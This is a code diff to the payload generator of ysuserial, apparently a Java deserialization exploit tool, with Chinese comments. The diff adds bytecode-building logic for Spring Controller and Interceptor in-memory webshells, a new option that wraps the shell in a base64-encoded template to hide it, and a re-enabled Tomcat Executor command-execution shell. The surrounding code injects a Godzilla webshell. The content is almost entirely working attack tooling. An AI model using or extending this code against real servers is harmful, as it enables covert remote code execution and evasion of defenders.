@@ -195,27 +195,33 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
-			// 如果是打入 Spring Controller 类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
-			if (className.contains("SpringInterceptorMS")) {
+			if (className.contains("Spring")) {
 
 				if (IS_INHERIT_ABSTRACT_TRANSLET) {
 					ctClass.setSuperclass(superClass);
 				}
 
-				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
-				CtClass springTemplateClass = pool.get(target);
-				springTemplateClass.setName(newClassName);
-				String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
+				// 如果是打入 Spring Interceptor 类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
+				if (className.contains("SpringInterceptorMS")) {
+					String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
+					CtClass springTemplateClass = pool.get(target);
+					springTemplateClass.setName(newClassName);
+					String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
 
-				// 修改b64字节码及类名
-				String b64content = "b64=\"" + encode + "\";";
-				ctClass.makeClassInitializer().insertBefore(b64content);
-				String clazzNameContent = "clazzName=\"" + newClassName + "\";";
-				ctClass.makeClassInitializer().insertBefore(clazzNameContent);
+					// 修改b64字节码及类名
+					String b64content = "b64=\"" + encode + "\";";
+					ctClass.makeClassInitializer().insertBefore(b64content);
+					String clazzNameContent = "clazzName=\"" + newClassName + "\";";
+					ctClass.makeClassInitializer().insertBefore(clazzNameContent);
 
-				// 修改类名
-				ctClass.setName(generateClassName());
-				classBytes = ctClass.toBytecode();
+					// 修改类名
+					ctClass.setName(generateClassName());
+					classBytes = ctClass.toBytecode();
+					// 如果是打入 Spring Controller 类型的内存马
+				} else if (className.contains("SpringControllerMS")) {
+					ctClass.setName(newClassName);
+					classBytes = ctClass.toBytecode();
+				}
 
 			} else if (className.contains("RMIBindTemplate")) {
 				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
@@ -317,6 +323,30 @@ public class Gadgets {
 			classBytes = ctClass.toBytecode();
 
 		}
+
+
+		if (HIDE_MEMORY_SHELL) {
+			switch (HIDE_MEMORY_SHELL_TYPE) {
+				case 1:
+					break;
+				case 2:
+					CtClass newClass = pool.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
+					newClass.setName(generateClassName());
+					String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
+					String className = "className=\"" + ctClass.getName() + "\";";
+					newClass.defrost();
+					newClass.makeClassInitializer().insertBefore(content);
+					newClass.makeClassInitializer().insertBefore(className);
+
+					if (IS_INHERIT_ABSTRACT_TRANSLET) {
+						newClass.setSuperclass(superClass);
+					}
+
+					classBytes = newClass.toBytecode();
+					break;
+			}
+		}
+
 
 		// 写出 class 试试
 //		writeClassToFile(ctClass.getName(), classBytes);
@@ -420,7 +450,7 @@ public class Gadgets {
 
 				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
 				break;
-//			// Tomcat Executor cmd 执行内存马
+			// Tomcat Executor cmd 执行内存马
 			case "execute":
 				ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
 				insertCMD(ctClass);
